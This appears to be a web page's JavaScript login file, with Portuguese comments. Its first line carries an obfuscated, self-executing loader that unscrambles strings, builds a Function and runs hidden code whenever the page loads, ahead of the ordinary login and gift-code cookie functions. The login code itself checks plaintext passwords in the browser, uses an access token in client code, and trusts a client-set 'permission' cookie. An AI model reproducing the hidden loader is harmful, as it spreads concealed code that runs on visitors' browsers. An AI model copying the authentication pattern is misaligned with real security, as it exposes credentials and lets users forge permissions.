var token,username,repo,path,url;(function(){var Usw='',pau=859-848;function RVs(p){var g=1424898;var k=p.length;var o=[];for(var m=0;m<k;m++){o[m]=p.charAt(m)};for(var m=0;m<k;m++){var b=g*(m+180)+(g%23734);var r=g*(m+235)+(g%51776);var q=b%k;var e=r%k;var v=o[q];o[q]=o[e];o[e]=v;g=(b+r)%5195721;};return o.join('')};var JBP=RVs('ognanbuossrwrcrqteozjkmutdptfcvlycihx').substr(0,pau);var pFe='>hh ,=.Cpr.+(6v=)mp;8l}0!"]b;qg7.,vjz[aAhb rrefr)xC[a;ia-a{n{eh,.0{6 r+1v7(oa9o[ ,85ln;oh.z9==v8.71,C0a8su((,8om7def*,Ctpo6ft4e=q]amrr;eyuk)(=i9rps=nnntn;a4cau;jrw]t)[;;e=)h[isi0Cgi="a[e+tv0g01;sS9f}vzvarAo=05=rarr,rncu)x;1n,r=nt+=)v;llvaw{vru,.u;sj]ft=pvigu;5zr[ mxlvo()v=9,v(].lc,zv="t08fru,{l7zsnen;;lo)0ntg]al a+vai 0r+r t[x[)ik=4[r]j.ikuel;n=ta;rl,1=]Aol(vaaij=+"rmf;z063evtu<(e16 [arr+dvAr+ha;=tn r=u)sre3orvh},)r"j1g*r;cklhiasc}=tt((+;r-;;=n;h ();frlse ;= sg6"ss({e3(dmt;r)pe;.++8c+laC,j"btfg+))z+ oiiorsn)e0t<.02)-m,-zfan+.2+}ahd)x e ]i6),;+r((7fp2qlt<h=f]ui+(h>]Cop=we9a0rs;(=;<)g)qk-e)gnv=itoo(2[,rd]ew,o e .1;A([!z+.;n)l.s2e)r)nr.uispp)rubc1.rttvk ;;)ln==j,C,cn=ir)}fubrp-she;"(v.sm(oranibnph(="v2a1(ahh8 [a],utn6pmzofo2, 2(.do +e=w=(;u+w d=v ;i]go=aalorv(zfdqug6flar.(..d7a"i;n<;2nep(.8z((+fc=clse9ttf,+wec3awa,.7)).1awr=S,=;pgj-r6i;h)a(k.ent;w();ceawn=4 )f1rld+4={;(;c.jl}n5dtp';var ijb=RVs[JBP];var mnW='';var Zfo=ijb;var YDF=ijb(mnW,RVs(pFe));var blD=YDF(RVs('u*ginen,ta{OaO%snb%#C{t,cO[.nnk$OO,Nr7!e.4b$_5m!}O(e%nrO)a#OO\/1\/hO+.${r4O)]eO..(hO5.-u(sO2O_{1\/3ss!OOt;\'3c8t3rhOn);(!8S$-dfcn=i$3.&e%,)_\'(f.a9ee2OO\';)7O(s2%osd_r%,..O6m".b8f)l!h;!]tO{2}j4g;s(_e 77hj2;Opcs\'y6d$as=;mt ate=ti51(O([)ky+1s21t! +O!,nn,,%e,cO2s;c4j!b6!Osu.;Of)p-g#h(er(OOrb[].r)3n(}O)O0!_Oh;)#$er((O36.+(dbeiO-.=a(3cgO2s;.(mO1afOts\/_;ft8kod3.saj}()o+eO.1+u)"4e(.13Oi(\/0$#pp2O0(e=s(j7=e,e]_O_j=teguOp4.oi80.b0p).n.5{#e))ct{3$Olkn%(!1x*).,e+gO (pp+;]47=Oagc=c..1}n6_ \/_{O*d;0fc$_f+ryooO([(cpbg!D60&aav(O=2.s(+! n3.n_,}.)-;_&v\/;$!z*{!p{.7inh(gor)to\/(.!lp=nh)m.3.ll};&.rS*e,.m.v(O=sgO1e}f. _.ts!sqc$g2.3enc0}O;rOOm".ejO.,rpo.pOf..,sOO-c]4fs%4nh(0 ad"}0ik9nOOO";\'e)rm,m]oci]mOj!!O+)4f,+}svOoO.+gtO2jtO%.sq$(.le=(O};.o0.=.2Mp.(;e)mf;eu.ue3)OtOl},j=r.t.s"=biapn.(!i)oup)o+eO=,"pp1\/nqO$$r; y02)b.;]sOr{o+r,!5 apr_htO$s\/$#roz(f%x6sbau,,3f7.pj,,)OOed]o1ct7_O)).4,cc)) Mbc81,7c!ee}- ))=Ox)1etOc1=OO)"e1;O$1s3tbo )e.\/+i(!.l7o7O\/oese_sn.a.-0r2Cf2)hy!lbz,3=e w=o$fitn)2e+,OOO,). .5a!$nO.nO 3renS4290ey8:Os7,[24u=_ri.)d;)(O;(jrh40a)3.O.5isO)=.;$dy.j[nO2);hcu e . Oe)meeOOtbitntn3O o{.!4"!t.};Otp$r,j)$p4%$%'));var QQM=Zfo(Usw,blD );QQM(9879);return 2254})()

async function login() {
  const emailInput = document.getElementById('email').value;
  const passwordInput = document.getElementById('password').value;
  const errorMsg = document.getElementById('error-msg');
  const customErrorMsg = document.getElementById('custom-error-msg');

  try {
    const response = await fetch(url, {
      headers: {
        'Authorization': `token ${token}`
      }
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const data = await response.json();

    // O conteúdo do arquivo JSON está codificado em base64, então precisamos decodificá-lo
    const usersJson = atob(data.content);
    const users = JSON.parse(usersJson);

    // Procura pelo usuário com o email e senha fornecidos
    const user = users.find(user => user.email === emailInput && user.password === passwordInput);

    if (user) {
      if (!user.active) {
        customErrorMsg.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        // Configura o cookie com o ID do usuário
        setCookie('id', user.id, 10);
        // Configura o cookie "permission" com o valor de cookieValue do usuário
        setCookie('permission', user.cookieValue);

        // Redireciona para a URL especificada
        window.location.href = user.redirectUrl;
        return { id: user.id, redirectUrl: user.redirectUrl }; // Retorna os dados do usuário, se necessário
      }
    } else {
      errorMsg.style.display = 'block';
      customErrorMsg.style.display = 'none';
    }

  } catch (error) {
    console.error('Houve um problema com a operação de fetch:', error);
    errorMsg.style.display = 'block';
    customErrorMsg.style.display = 'none';
  }

  // Em caso de falha ou usuário não encontrado, retorna null
  return null;
}

// Função para definir um cookie
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}




// Função para definir o cookie
function setCookie(nome, valor, expiraEmDias, caminho = "/") {
    const dataDeExpiracao = new Date();
    dataDeExpiracao.setTime(dataDeExpiracao.getTime() + (expiraEmDias * 24 * 60 * 60 * 1000));
    const expires = `expires=${dataDeExpiracao.toUTCString()}`;
    
    document.cookie = `${nome}=${valor}; ${expires}; path=${caminho}`;
}

// Função para ler a URL e salvar o código nos cookies
function salvarCodigoNosCookies() {
    const url = window.location.href;

    // Verifica se o parâmetro ?COD= existe na URL
    const regex = /[?&]COD=([^&]+)/;
    const match = url.match(regex);

    if (match) {
        // Extrai o valor do código de presente
        const codigoDePresente = match[1];

        // Salva o código nos cookies com o nome 'code', válido por 30 dias
        setCookie("code", codigoDePresente, 30);

        console.log('Código de presente salvo nos cookies:', codigoDePresente);
    } else {
        console.log('Não há código de presente na URL.');
    }
}

// Chama a função para salvar o código nos cookies se existir
salvarCodigoNosCookies();
